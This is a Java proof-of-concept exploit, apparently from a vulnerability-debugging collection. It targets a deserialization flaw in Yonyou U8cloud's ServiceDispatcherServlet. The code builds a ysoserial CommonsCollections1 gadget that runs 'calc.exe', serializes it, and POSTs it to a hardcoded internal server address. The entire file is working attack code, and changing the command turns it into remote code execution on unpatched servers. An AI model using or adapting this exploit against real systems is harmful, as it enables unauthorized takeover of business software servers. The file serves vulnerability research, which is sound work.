package cve.u8cloud;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import nc.bs.framework.comn.NetObjectOutputStream;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;

/**
 * 漏洞：
 * U8cloud所有版本ServiceDispatcher接口存在反序列化漏洞
 * https://security.yonyou.com/#/patchInfo?foreignKey=7bd5b43e2c984a618b2b1d3f288110ae
 */
public class ServiceDispatcherServlet_deserialize {

    public static void main(String[] args) throws Exception {


        String url = "http://10.58.120.201:8088/ServiceDispatcherServlet";
        String gadget = "CommonsCollections1";
        String cmd = "cmd.exe /c calc.exe";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        NetObjectOutputStream.writeObject(bos,obj);

        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpRequest.sendByteArrayPost(httpPost, bos.toByteArray());
    }
}


